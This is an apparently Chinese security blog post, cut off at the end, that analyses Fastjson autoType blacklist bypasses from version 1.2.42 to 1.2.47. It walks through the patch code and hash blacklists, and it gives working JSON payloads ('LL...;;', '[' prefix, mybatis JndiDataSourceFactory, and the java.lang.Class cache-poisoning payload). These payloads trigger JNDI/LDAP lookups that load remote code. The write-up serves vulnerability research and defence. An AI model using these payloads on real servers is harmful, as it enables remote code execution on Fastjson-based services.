1.2.42 3730752432285826863 0x33c64b921f523f2fL java.rmi 1.2.42 3794316665763266033 0x34a81ee78429fdf1L java.util.prefs. 1.2.42 4147696707147271408 0x398f942e01920cf0L com.sun. 1.2.42 5347909877633654828 0x4a3797b30328202cL java.util.logging. 1.2.42 5450448828334921485 0x4ba3e254e758d70dL org.apache.bcel 1.2.42 5751393439502795295 0x4fd10ddc6d13821fL java.net.Socket 1.2.42 5944107969236155580 0x527db6b46ce3bcbcL org.apache.commons.fileupload 1.2.42 6742705432718011780 0x5d92e6ddde40ed84L org.jboss 1.2.42 7179336928365889465 0x63a220e60a17c7b9L org.hibernate 1.2.42 7442624256860549330 0x6749835432e0f0d2L org.apache.commons.collections.functors 1.2.42 8838294710098435315 0x7aa7ee3627a19cf3L org.apache.myfaces.context.servlet 1.2.43 -2262244760619952081 0xe09ae4604842582fL java.net.URL 1.2.46 -8165637398350707645 0x8eadd40cb2a94443L junit. 1.2.46 -8083514888460375884 0x8fd1960988bce8b4L org.apache.ibatis.datasource 1.2.46 -7921218830998286408 0x92122d710e364fb8L org.osjava.sj. 1.2.46 -7768608037458185275 0x94305c26580f73c5L org.apache.log4j. 1.2.46 -6179589609550493385 0xaa3daffdb10c4937L org.logicalcobwebs. 1.2.46 -5194641081268104286 0xb7e8ed757f5d13a2L org.apache.logging. 1.2.46 -3935185854875733362 0xc963695082fd728eL org.apache.commons.dbcp 1.2.46 -2753427844400776271 0xd9c9dbf6bbd27bb1L com.ibatis.sqlmap.engine.datasource 1.2.46 -1589194880214235129 0xe9f20bad25f60807L org.jdom. 1.2.46 1073634739308289776 0xee6511b66fd5ef0L org.slf4j. 1.2.46 5688200883751798389 0x4ef08c90ff16c675L javassist. 1.2.46 7017492163108594270 0x616323f12c2ce25eL oracle.net 1.2.46 8389032537095247355 0x746bd4a53ec195fbL org.jaxen. 1.2.48 1459860845934817624 0x144277b467723158L java.net.InetAddress 1.2.48 8409640769019589119 0x74b50bb9260e31ffL java.lang.Class 1.2.49 4904007817188630457 0x440e89208f445fb9L com.alibaba.fastjson.annotation 1.2.59 5100336081510080343 0x46c808a4b5841f57L org.apache.cxf.jaxrs.provider. 1.2.59 6456855723474196908 0x599b5c1213a099acL ch.qos.logback. 1.2.59 8537233257283452655 0x767a586a5107feefL net.sf.ehcache.transaction.manager. 1.2.60 3688179072722109200 0x332f0b5369a18310L com.zaxxer.hikari. 1.2.61 -4401390804044377335 0xc2eb1e621f439309L flex.messaging.util.concurrent.AsynchBeansWorkManagerExecutor 1.2.61 -1650485814983027158 0xe9184be55b1d962aL org.apache.openjpa.ee. 1.2.61 -1251419154176620831 0xeea210e8da2ec6e1L oracle.jdbc.rowset.OracleJDBCRowSet 1.2.61 -9822483067882491 0xffdd1a80f1ed3405L com.mysql.cj.jdbc.admin. 1.2.61 99147092142056280 0x1603dc147a3e358L oracle.jdbc.connector.OracleManagedConnectionFactory 1.2.61 3114862868117605599 0x2b3a37467a344cdfL org.apache.ibatis.parsing. 1.2.61 4814658433570175913 0x42d11a560fc9fba9L org.apache.axis2.jaxws.spi.handler. 1.2.61 6511035576063254270 0x5a5bd85c072e5efeL jodd.db.connection. 1.2.61 8925522461579647174 0x7bddd363ad3998c6L org.apache.commons.configuration.JNDIConfiguration 1.2.62 -9164606388214699518 0x80d0c70bcc2fea02L org.apache.ibatis.executor. 1.2.62 -8649961213709896794 0x87f52a1b07ea33a6L net.sf.cglib. 1.2.62 -5764804792063216819 0xafff4c95b99a334dL com.mysql.cj.jdbc.MysqlDataSource 1.2.62 -4438775680185074100 0xc2664d0958ecfe4cL aj.org.objectweb.asm. 1.2.62 -3319207949486691020 0xd1efcdf4b3316d34L oracle.jdbc. 1.2.62 -2192804397019347313 0xe1919804d5bf468fL org.apache.commons.collections.comparators. 1.2.62 -2095516571388852610 0xe2eb3ac7e56c467eL net.sf.ehcache.hibernate. 1.2.62 4750336058574309 0x10e067cd55c5e5L com.mysql.cj.log. 1.2.62 218512992947536312 0x3085068cb7201b8L org.h2.jdbcx. 1.2.62 823641066473609950 0xb6e292fa5955adeL org.apache.commons.logging. 1.2.62 1534439610567445754 0x154b6cb22d294cfaL org.apache.ibatis.reflection. 1.2.62 1818089308493370394 0x193b2697eaaed41aL org.h2.server. 1.2.62 2164696723069287854 0x1e0a8c3358ff3daeL org.apache.ibatis.datasource. 1.2.62 2653453629929770569 0x24d2f6048fef4e49L org.objectweb.asm. 1.2.62 2836431254737891113 0x275d0732b877af29L flex.messaging.util.concurrent. 1.2.62 3089451460101527857 0x2adfefbbfe29d931L org.apache.ibatis.javassist. 1.2.62 3718352661124136681 0x339a3e0b6beebee9L org.apache.ibatis.ognl. 1.2.62 4046190361520671643 0x3826f4b2380c8b9bL com.mysql.cj.jdbc.MysqlConnectionPoolDataSource 1.2.62 6280357960959217660 0x5728504a6d454ffcL org.apache.ibatis.scripting. 1.2.62 6734240326434096246 0x5d74d3e5b9370476L com.mysql.cj.jdbc.MysqlXADataSource 1.2.62 7123326897294507060 0x62db241274397c34L org.apache.commons.collections.functors. 1.2.62 8488266005336625107 0x75cc60f5871d0fd3L org.apache.commons.configuration 目前未知的哈希黑名单： version hash hex-hash name 1.2.42 33238344207745342 0x761619136cc13eL 1.2.62 -6316154655839304624 0xa85882ce1044c450L 1.2.62 -5472097725414717105 0xb40f341c746ec94fL 1.2.62 -4608341446948126581 0xc00be1debaf2808bL 1.2.62 3256258368248066264 0x2d308dbbc851b0d8L 1.2.62 4841947709850912914 0x43320dc9d2ae0892L 1.2.62 6534946468240507089 0x5ab0cb3071ab40d1L 关键是在ParserConfig.java中修改了以下两点： 修改明文黑名单为黑名单hash 对于传入的类名，删除开头L和结尾的; 对于第二点，仔细跟进去看一下： 12345678910111213141516171819202122232425262728293031323334353637383940414243// hash算法常量 final long BASIC = 0xcbf29ce484222325L; final long PRIME = 0x100000001b3L; // 对传入类名的第一位和最后一位做了hash，如果是L开头，;结尾，删去开头结尾 // 可以发现这边只进行了一次删除 if ((((BASIC ^ className.charAt(0)) * PRIME) ^ className.charAt(className.length() - 1)) * PRIME == 0x9198507b5af98f0L) &#123; className = className.substring(1, className.length() - 1); &#125; // 计算处理后的类名的前三个字符的hash final long h3 = (((((BASIC ^ className.charAt(0)) * PRIME) ^ className.charAt(1)) * PRIME) ^ className.charAt(2)) * PRIME; if (autoTypeSupport || expectClass != null) &#123; long hash = h3; //基于前三个字符的hash结果继续进行hash运算 //这边一位一位运算比较其实就相当于之前的startswith，开头匹配 for (int i = 3; i &lt; className.length(); ++i) &#123; hash ^= className.charAt(i); hash *= PRIME; //将运算结果跟白名单做比对 if (Arrays.binarySearch(acceptHashCodes, hash) &gt;= 0) &#123; clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false); if (clazz != null) &#123; return clazz; &#125; &#125; //将运算结果跟黑名单做比对 if (Arrays.binarySearch(denyHashCodes, hash) &gt;= 0 &amp;&amp; TypeUtils.getClassFromMapping(typeName) == null) &#123; throw new JSONException(\"autoType is not support. \" + typeName); &#125; &#125; &#125; //之后就是一样的处理，根据类名加载类 确实有效的干掉了L开头；结尾的payload。 1.2.42 绕过但是在以上的处理中，发现只删除了一次开头的L和结尾的;，这里就好像使用黑名单预防SQL注入，只删除了一次敏感词汇的防御错误一样，重复一下就可以被轻易的绕过。所以payload如下： 1&#123;\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"ldap://localhost:1389/Exploit\", \"autoCommit\":true&#125; 关键PoC为：LLcom.sun.rowset.JdbcRowSetImpl;; 在1.2.22-1.2.42版本运行都能成功触发： 绕过分析自1.2.42版本开始，在ParserConfig.java中可以看到黑名单改为了哈希黑名单： 1denyHashCodes = new long[]&#123;-8720046426850100497L,-8109300701639721088L,-7966123100503199569L,-7766605818834748097L,-6835437086156813536L,-4837536971810737970L,-4082057040235125754L,-2364987994247679115L,-1872417015366588117L,-254670111376247151L,-190281065685395680L,33238344207745342L,313864100207897507L,1203232727967308606L,1502845958873959152L,3547627781654598988L,3730752432285826863L,3794316665763266033L,4147696707147271408L,5347909877633654828L,5450448828334921485L,5751393439502795295L,5944107969236155580L,6742705432718011780L,7179336928365889465L,7442624256860549330L,8838294710098435315L&#125;; 在checkAutoType()函数中，通过调试发现这段代码会对”L”开头和”;”结尾的类名进行一次提取操作： 但由于只进行一次提取操作，因此可以通过添加两次的方式来绕过后面的黑名单校验。 后面的代码，是对提取出来的className即Lcom.sun.rowset.JdbcRowSetImpl;进行denyList黑名单过滤，也就顺利绕过了。 注意下，在后面调用TypeUtils.loadClass()函数时，传入的是我们输入的LLcom.sun.rowset.JdbcRowSetImpl;;。 为何添加了两次的类名也能成功触发呢？我们跟进TypeUtils.loadClass()函数中可以发现，在”L”和”;”之间提取出类名后，会再次调用自身函数loadClass()，也就是说只要检测出”L”开头和”;”结尾的字符都会调用自身来循环提取出真正的类名。 1.2.43 漏洞修复在1.2.43中对于1.2.42版本可绕过的情况进行了修复。 修改了com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class, int)的部分代码： 12345678910111213//hash计算基础参数 long BASIC = -3750763034362895579L; long PRIME = 1099511628211L; //L开头，；结尾 if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) &#123; //LL开头 if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(1)) * 1099511628211L == 655656408941810501L) &#123; //直接爆出异常 throw new JSONException(\"autoType is not support. \" + typeName); &#125; className = className.substring(1, className.length() - 1); &#125; 可见就对了LL开头的绕过进行了封堵。 至此我们之前的两个利用链JdbcRowSetImpl和TemplatesImpl正式被封堵了（暂时）。在服务端放开白名单限制的情况下也绕不过黑名单。更别说服务端默认是开启白名单的，这时候fastjson的风险已经很小了。 之后就是不断有新的组件作为利用链引入进行攻击，和黑名单的不断扩充之间的拉锯战。（之前也说过着一切都是在显性关闭白名单的情况下） 1.2.43 绕过之前在类的加载TypeUtils.loadClass发现有两种特殊处理方式： 如果这个className是以[开头我们会去掉[进行加载！ 如果这个className是以L开头;结尾，就会去掉开头和结尾进行加载！ 之前版本都是主攻第二种，这里的绕过方式就是针对的第一种，也就是针对[的骚操作。 先直接上payload嗷： 1&#123;\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[&#123;,\"dataSourceName\":\"ldap://localhost:1389/Exploit\", \"autoCommit\":true&#125; 关键PoC：[com.sun.rowset.JdbcRowSetImpl 但是如果我们一开始payload直接这样写是会报错的： 1&#123;\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/Exploit\", \"autoCommit\":true&#125; 报错信息如下，显示期待在42列的位置接受个”[“符号，而42列正好是第一个逗号”,”前一个位置： 1Exception in thread \"main\" com.alibaba.fastjson.JSONException: exepct '[', but ,, pos 42, json : &#123;\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/Exploit\", \"autoCommit\":true&#125; 因此改下payload，在第一个逗号前面加个”[“： 1&#123;\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[,\"dataSourceName\":\"ldap://localhost:1389/Exploit\", \"autoCommit\":true&#125; 继续报错，显示期待在43列的位置接受个”{“符号，而43列正好是紧跟在新加的”[“字符的后一个位置： 1Exception in thread \"main\" com.alibaba.fastjson.JSONException: syntax error, expect &#123;, actual string, pos 43, fastjson-version 1.2.43 因此就修改得到最终版payload，能够成功触发： 绕过分析在TypeUtils.loadClass()函数中，除了前面看到的判断是否以”L”开头、以”;”结尾的if判断语句外，在其前面还有一个判断是否以”[“开头的if判断语句，是的话就提取其中的类名，并调用Array.newInstance().getClass()来获取并返回类： 解析完返回的类名是”[com.sun.rowset.JdbcRowSetImpl”，通过checkAutoType()函数检测之后，到后面就是读该类进行反序列化了： 在反序列化中，调用了DefaultJSONParser.parseArray()函数来解析数组内容，其中会有一些if判断语句校验后面的字符内容是否为”[“、”{“等，前面一开始尝试的几个payload报错的原因正是出在这里： 1.2.44 漏洞修复修补了上面的[利用方式。 直接抛异常，难受住，家人们； 1.2.44 绕过前提条件：需要目标服务端存在mybatis的jar包，且版本需为3.x.x系列&lt;3.5.0的版本。 maven： 123456&lt;!-- https://mvnrepository.com/artifact/org.mybatis/mybatis --&gt;&lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis&lt;/artifactId&gt; &lt;version&gt;3.4.6&lt;/version&gt;&lt;/dependency&gt; 直接给出payload，要连LDAP或RMI都可以： 1&#123;\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":&#123;\"data_source\":\"ldap://localhost:1389/Exploit\"&#125;&#125; 关键PoC：org.apache.ibatis.datasource.jndi.JndiDataSourceFactory 主要就是黑名单绕过，这个类我们在哈希黑名单中1.2.45的版本中可以看到： version hash hex-hash name 1.2.46 -8083514888460375884 0x8fd1960988bce8b4L org.apache.ibatis.datasource 黑名单封堵呢，其实是一个动态的过程，会有很多新增的jar包，如果服务端引入了这些额外的jar包，就会引入一条可利用链，，或者jdk又被发掘出了新增的链等等都会导致黑名单可被绕过。当然在1.2.25之后这都是要在显性白名单的情况下，才有的问题。 之后更新的版本比如1.2.46也都在补充黑名单。 运行即可成功触发，害怕!： 绕过分析由于”org.apache.ibatis.datasource.jndi.JndiDataSourceFactory”不在黑名单中，因此能成功绕过checkAutoType()函数的检测。 继续往下调试分析org.apache.ibatis.datasource.jndi.JndiDataSourceFactory这条利用链的原理。 由于payload中设置了properties属性值，且JndiDataSourceFactory.setProperties()方法满足之前说的Fastjson会自动调用的setter方法的条件，因此可被利用来进行Fastjson反序列化漏洞的利用。 直接在该setter方法打断点，可以看到会调用到这来，这里就是熟悉的JNDI注入漏洞了，即InitialContext.lookup()，其中参数由我们输入的properties属性中的data_source值获取的,这里面还是需要调试时候直接断点跳转的： 之后就是由JNDI注入漏洞成功触发Fastjson反序列化漏洞了。 函数调用栈如下： 123456789101112131415161718192021222324&lt;init&gt;:10, ExploitnewInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)newInstance:57, NativeConstructorAccessorImpl (sun.reflect)newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)newInstance:526, Constructor (java.lang.reflect)newInstance:383, Class (java.lang)getObjectFactoryFromReference:163, NamingManager (javax.naming.spi)getObjectInstance:188, DirectoryManager (javax.naming.spi)c_lookup:1086, LdapCtx (com.sun.jndi.ldap)p_lookup:544, ComponentContext (com.sun.jndi.toolkit.ctx)lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)lookup:203, GenericURLContext (com.sun.jndi.toolkit.url)lookup:94, ldapURLContext (com.sun.jndi.url.ldap)lookup:411, InitialContext (javax.naming)setProperties:56, JndiDataSourceFactory (org.apache.ibatis.datasource.jndi)deserialze:-1, FastjsonASMDeserializer_1_JndiDataSourceFactory (com.alibaba.fastjson.parser.deserializer)deserialze:267, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)parseObject:384, DefaultJSONParser (com.alibaba.fastjson.parser)parse:1356, DefaultJSONParser (com.alibaba.fastjson.parser)parse:1322, DefaultJSONParser (com.alibaba.fastjson.parser)parse:152, JSON (com.alibaba.fastjson)parse:162, JSON (com.alibaba.fastjson)parse:131, JSON (com.alibaba.fastjson)main:8, JdbcRowSetImplPoc 1.2.47 通杀！我们在分析1.2.47时，将从一个挖掘0day的角度去一步步分析，企图复现这个漏洞的挖掘过程，不然正向看，不得劲。payload在最后给出。 我们重新来理一下com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class, int)这个阻挠我们的方法，上面我们提到过白名单开关时我们走的是不一样的路线，还在注释中提到会有一些固定类型的判断，这就是通杀payload的关键。 我们接下来看的是1.2.47版本的包，我们看总结后的代码结构： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) &#123; //1.typeName为null的情况，略 //2.typeName太长或太短的情况，略 //3.替换typeName中$为.，略 //4.使用hash的方式去判断[开头，或L开头;结尾，直接报错 //这里经过几版的修改，有点不一样了，但是绕不过，也略 //5.autoTypeSupport为true(白名单关闭)的情况下，返回符合白名单的，报错符合黑名单的 //(这里可以发现，白名单关闭的配置情况下，必须先过黑名单，但是留下了一线生机) if (autoTypeSupport || expectClass != null) &#123; long hash = h3; for (int i = 3; i &lt; className.length(); ++i) &#123; hash ^= className.charAt(i); hash *= PRIME; if (Arrays.binarySearch(acceptHashCodes, hash) &gt;= 0) &#123; clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false); if (clazz != null) &#123; return clazz; &#125; &#125; //要求满足黑名单并且从一个Mapping中找不到这个类才会报错，这个Mapping就是我们的关键 if (Arrays.binarySearch(denyHashCodes, hash) &gt;= 0 &amp;&amp; TypeUtils.getClassFromMapping(typeName) == null) &#123; throw new JSONException(\"autoType is not support. \" + typeName); &#125; &#125; &#125; //6.从一个Mapping中获取这个类名的类，我们之后看 if (clazz == null) &#123; clazz = TypeUtils.getClassFromMapping(typeName); &#125; //7.从反序列化器中获取这个类名的类，我们也之后看 if (clazz == null) &#123; clazz = deserializers.findClass(typeName); &#125; //8.如果在6，7中找到了clazz，这里直接return出去，不继续了 if (clazz != null) &#123; if (expectClass != null &amp;&amp; clazz != java.util.HashMap.class &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123; throw new JSONException(\"type not match. \" + typeName + \" -&gt; \" + expectClass.getName()); &#125; //无论是默认白名单开启还是手动白名单关闭的情况，我们都要从这个return clazz中出去 return clazz; &#125; // 9. 针对默认白名单开启情况的处理，这里 if (!autoTypeSupport) &#123; long hash = h3; for (int i = 3; i &lt; className.length(); ++i) &#123; char c = className.charAt(i); hash ^= c; hash *= PRIME; //碰到黑名单就死 if (Arrays.binarySearch(denyHashCodes, hash) &gt;= 0) &#123; throw new JSONException(\"autoType is not support. \" + typeName); &#125; //满足白名单可以活，但是白名单默认是空的 if (Arrays.binarySearch(acceptHashCodes, hash) &gt;= 0) &#123; if (clazz == null) &#123; clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false); &#125; //针对expectCLass的特殊处理，没有expectCLass，不管 if (expectClass != null &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123; throw new JSONException(\"type not match. \" + typeName + \" -&gt; \" + expectClass.getName()); &#125; return clazz; &#125; &#125; &#125; //通过以上全部检查，就可以从这里读取clazz if (clazz == null) &#123; clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false); &#125; //这里对一些特殊的class进行处理，不重要 //特性判断等 return clazz; &#125; 仔细分析了一下，可以发现无论是白名单开启与否，我们的恶意类都要想办法必须要从第8步的return clazz出去才有机会。 因为白名单关闭（手动）时，我们如果进入第九步，会百分百跟黑名单正面撞上，必然被杀。我们只能在这之前溜出去，机会就在6，7步中。 白名单开启时（默认），虽然在第五步时，我们也会跟黑名单撞上，但是却莫名其妙的会有一线生机，只要满足TypeUtils.getClassFromMapping(typeName) != null（是!=）反而可以从黑名单中逃开。然后从第八步中return出去。 那往之前看clazz可以从哪里赋值，5、6、7三个地方，但是5是白名单匹配才返回。这不可能。 于是开始关注6，7这两个操作到底是干啥的，（其实根据已知白名单开不开都通杀的特性，肯定是在第6步TypeUtils.getClassFromMapping中得到的恶意类，但是这边都瞅瞅，后面也会用到） TypeUtils.getClassFromMapping(typeName) deserializers.findClass(typeName) deserializers.findClass(typeName)先看desesrializers，一个hashmap 1private final IdentityHashMap&lt;Type, ObjectDeserializer&gt; deserializers = new IdentityHashMap&lt;Type, ObjectDeserializer&gt;(); 因为我们是从中取值，关注一下它是在哪里赋值的,发现是在initDeserializers里面赋值的： initDeserializers这个函数是在parserConfig类的构造函数中初始化时调用的，存放的是一些认为没有危害的固定常用类。理所当然不会包含我们的利用类。 除此之外还有两个函数会影响到desesrializers这个map： getDeserializer 1com.alibaba.fastjson.parser.ParserConfig#getDeserializer(java.lang.Class&lt;?&gt;, java.lang.reflect.Type) 这个函数里面是会往deserializers这个mapping中放入一些特定类：java.awt.*、java.time.*、java.util.Optional*、java.nio.file.Path、Map.Entry.class、以及在服务器META-INF/services/目录下存放的class文件，还有枚举类的一些判断。对于一些数组，集合，map等再调用putDesserializer（这也是另一个会影响到desesrializers这个map的类）放入deserializers这个mapping中。 在这个类中对于类名有着严格的要求和限定，不太行。看下一个。 putDeserializer 12345com.alibaba.fastjson.parser.ParserConfig#putDeserializer public void putDeserializer(Type type, ObjectDeserializer deserializer) &#123; deserializers.put(type, deserializer); &#125; 代码极其简单，但是只在ParserConfig#getDeserializer和initJavaBeanDeserializers类中使用过。但是后者是一个初始化函数，我们同样不可控输入值。 那么我们好像发现我们的输入不可以改变deserializers这个mapping的值，从而自然也不能进一步在checkAutoType中被get读取出来，也就绕过不了。 这个deserializers在checkAutoType方法中存在的意义应该是直接放行一些常用的类，来提升解析速度。 那换一条路看看TypeUtils.getClassFromMapping(typeName)。 TypeUtils.getClassFromMapping(typeName)先看getClassFromMapping： 1234567//这个map是一个hashmapprivate static ConcurrentMap&lt;String,Class&lt;?&gt;&gt; mappings = new ConcurrentHashMap&lt;String,Class&lt;?&gt;&gt;(16, 0.75f, 1); ... public static Class&lt;?&gt; getClassFromMapping(String className)&#123; //很简单的一个mapping的get return mappings.get(className); &#125; 按照套路去寻找影响这个mappings的put方法。搜索mappings.put，在下面这两个方法中有找到： 12com.alibaba.fastjson.util.TypeUtils#addBaseClassMappingscom.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader, boolean) 看addBaseClassMappings这个方法，它是一个没有传参的方法….这样我们就没有一个可控的参数去控制其中的内容。 前者是一个static静态代码块： 123static&#123; addBaseClassMappings(); &#125; 后者是一个clearClassMapping方法： 1234public static void clearClassMapping()&#123; mappings.clear(); addBaseClassMappings();&#125; 没戏，不可控。 再看另一个有mappings.put的位置TypeUtils.loadClass，我们需要详细看看这个方法： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, boolean cache) &#123; //判断className是否为空，是的话直接返回null if(className == null || className.length() == 0)&#123; return null; &#125; //判断className是否已经存在于mappings中 Class&lt;?&gt; clazz = mappings.get(className); if(clazz != null)&#123; //是的话，直接返回 return clazz; &#125; //判断className是否是[开头，1.2.44中针对限制的东西就是这个 if(className.charAt(0) == '[')&#123; Class&lt;?&gt; componentType = loadClass(className.substring(1), classLoader); return Array.newInstance(componentType, 0).getClass(); &#125; //判断className是否L开头;结尾，1.2.42/43中针对限制的就是这里，但都是在外面限制的，里面的东西没变 if(className.startsWith(\"L\") &amp;&amp; className.endsWith(\";\"))&#123; String newClassName = className.substring(1, className.length() - 1); return loadClass(newClassName, classLoader); &#125; //1. 我们需要关注的mappings在这里有 try&#123; //输入的classLoader不为空时 if(classLoader != null)&#123; //调用加载器去加载我们给的className clazz = classLoader.loadClass(className); //！！如果cache为true！！ if (cache) &#123; //往我们关注的mappings中写入这个className mappings.put(className, clazz); &#125; return clazz;//返回加载出来的类 &#125; &#125; catch(Throwable e)&#123; e.printStackTrace(); // skip &#125; //2. 在这里也有，但是好像这里有关线程，比较严格。 try&#123; ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader(); if(contextClassLoader != null &amp;&amp; contextClassLoader != classLoader)&#123; clazz = contextClassLoader.loadClass(className); //同样需要输入的cache为true，才有可能修改 if (cache) &#123; mappings.put(className, clazz); &#125; return clazz; &#125; &#125; catch(Throwable e)&#123; // skip &#125; //3. 这里也有，限制很松 try&#123; //加载类 clazz = Class.forName(className); //直接放入mappings中 mappings.put(className, clazz); return clazz; &#125; catch(Throwable e)&#123; // skip &#125; return clazz; &#125; 可以发现如果可以控制输入参数，是可以往这个mappings中写入任意类名的（从而绕过autocheck的黑白名单）。 看看这个函数在什么地方被引用。 在这里面只需要找到符合条件的即可，也就是第三个参数cache=true，发现在1206行，跳转过去看： 但跟进去发现这里是在调用自己内部本身，继续依次看，发现一个敏感接口： 1/com/alibaba/fastjson/serializer/MiscCodec.java#deserialze(DefaultJSONParser parser, Type clazz, Object fieldName):334 跟进去执行分析： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263public &lt;T&gt; T deserialze(DefaultJSONParser parser, Type clazz, Object fieldName) &#123; JSONLexer lexer = parser.lexer; //4. clazz类型等于InetSocketAddress.class的处理。 //我们需要的clazz必须为Class.class，不进入 if (clazz == InetSocketAddress.class) &#123; ... &#125; Object objVal; //3. 下面这段赋值objVal这个值 //此处这个大的if对于parser.resolveStatus这个值进行了判断，我们在稍后进行分析这个是啥意思 if (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) &#123; //当parser.resolveStatus的值为 TypeNameRedirect parser.resolveStatus = DefaultJSONParser.NONE; parser.accept(JSONToken.COMMA); //lexer为json串的下一处解析点的相关数据 //如果下一处的类型为string if (lexer.token() == JSONToken.LITERAL_STRING) &#123; //判断解析的下一处的值是否为val，如果不是val，报错退出 if (!\"val\".equals(lexer.stringVal())) &#123; throw new JSONException(\"syntax error\"); &#125; //移动lexer到下一个解析点 //举例：\"val\":(移动到此处-&gt;)\"xxx\" lexer.nextToken(); &#125; else &#123; throw new JSONException(\"syntax error\"); &#125; parser.accept(JSONToken.COLON); //此处获取下一个解析点的值\"xxx\"赋值到objVal objVal = parser.parse(); parser.accept(JSONToken.RBRACE); &#125; else &#123; //当parser.resolveStatus的值不为TypeNameRedirect //直接解析下一个解析点到objVal objVal = parser.parse(); &#125; String strVal; //2. 可以看到strVal是由objVal赋值，继续往上看 if (objVal == null) &#123; strVal = null; &#125; else if (objVal instanceof String) &#123; strVal = (String) objVal; &#125; else &#123; //不必进入的分支 &#125; if (strVal == null || strVal.length() == 0) &#123; return null; &#125; //省略诸多对于clazz类型判定的不同分支。 //1. 可以得知，我们的clazz必须为Class.class类型 if (clazz == Class.class) &#123; //我们由这里进来的loadCLass //strVal是我们想要可控的一个关键的值，我们需要它是一个恶意类名。往上看看能不能得到一个恶意类名。 return (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader()); &#125; 那么经过分析，我们可以得到的关注点又跑到parser.resolveStatus这上面来了 当parser.resolveStatus == TypeNameRedirect 我们需要json串中有一个“val”:”恶意类名”，来进入if语句的true中，污染objVal，再进一步污染strVal。我们又需要clazz为class类来满足if判断条件进入loadClass。 所以一个json串的格式大概为&quot;@type&quot;=&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;恶意类名&quot; 这样一个东西，大概如此。 当parser.resolveStatus ！= TypeNameRedirect进入if判断的false中，可以直接污染objVal。 再加上clazz=class类，大概需要一个json串如下:&quot;被屏蔽的type&quot;=&quot;java.lang.Class&quot;,&quot;恶意类名&quot;。 至于哪里调用了MiscCodec.java#deserialze，查看引用处其实可以发现这是一个非常多地方会调用到的常用函数，就比如解析过程中的com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)-384行 定向构造payload那么在得到如上信息中，我们就不必一直大海摸虾。之前拿到了两个分支paylaod，拿一个可能的paylaod，试试水看看能不能往TypeUtils.getClassFromMapping(typeName）里面的mapping污染我们的恶意类。 1234&#123; \"@type\": \"java.lang.Class\", \"val\": \"com.sun.rowset.JdbcRowSetImpl\"&#125; 先是日常进入解析主要函数com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object) 这里有我们的三个在乎的点，如下顺序： 12345678910public final Object parseObject(final Map object, Object fieldName) &#123; ... //先是checkAutoType这个万恶的过滤函数 clazz = config.checkAutoType(typeName, null, lexer.getFeatures()); ... //ResolveStatus的赋值 this.setResolveStatus(TypeNameRedirect); //污染TypeUtils.getClassFromMapping的触发处 Object obj = deserializer.deserialze(this, clazz, fieldName);&#125; com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class, int)这个分析过了。 step out之后继续跟进，可以看到，给ResolveStatus赋值了TypeNameRedirect，这样到deserialze里面就可以确定了分支，与预计吻合。 继续跟，就到了第三个关注点deserialize函数： 果断跟进去！ 继续跟，恶意类被解析赋值！ 跳过后续的一堆if判断，来到符合条件的clazz对象，跟进去： 默认的cache为true，接下来就会进入三个mapping.put条件，跟下去，看看哪个能触发： 第一个，发现classloader是null，被skip掉了。 来到第二个，跟进去，发现被加入到map中了，sum+1： 第二个if中，帮我们加载了一个classloader，再因为上一层的cache默认为true，就真的执行成功了mappings.put放入了我们的恶意类名！ 完美穿针引线，一环扣一环，往mappings中加入了我们的恶意类。 老习惯，附上调用栈： 定稿payload之前看到其他博客说，一开始payload是分成两截，因为服务器的mappings自从加过恶意类之后，就会一直保持，然后就可以随便打了。 但是之后为了不让负载均衡，平摊payload造成有几率失败，就变成了下面这个： 1234567891011&#123; \"a\":&#123; \"@type\":\"java.lang.Class\", \"val\":\"com.sun.rowset.JdbcRowSetImpl\" &#125;, \"b\":&#123; \"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"ldap://localhost:1389/Exploit\", \"autoCommit\":true &#125;&#125; payload： 12345678public class JdbcRowSetImplPoc &#123; public static void main(String[] argv)&#123; String payload = \"&#123;\\\"a\\\":&#123;\\\"@type\\\":\\\"java.lang.Class\\\",\\\"val\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\"&#125;,\" + \"\\\"b\\\":&#123;\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\" + 